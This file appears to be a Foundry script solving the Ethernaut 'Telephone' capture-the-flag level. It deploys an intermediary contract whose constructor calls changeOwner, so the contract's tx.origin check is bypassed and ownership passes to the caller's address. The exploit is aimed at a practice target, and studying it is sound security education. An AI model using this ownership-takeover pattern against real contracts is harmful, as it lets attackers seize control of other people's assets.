//SPDX: License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Telephone.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract Intermediary {
    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}
contract TelephoneSolution is Script {
   
   Telephone public telephoneInstance = Telephone(0x7bAFA8129953084FE70A36E36bA9698D6b5d1642);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Previous Owner", telephoneInstance.owner());
        new Intermediary (
            telephoneInstance, vm.envAddress("MY_ADDRESS")
        );
        console.log("New Owner", telephoneInstance.owner());
        vm.stopBroadcast();
    }
   
}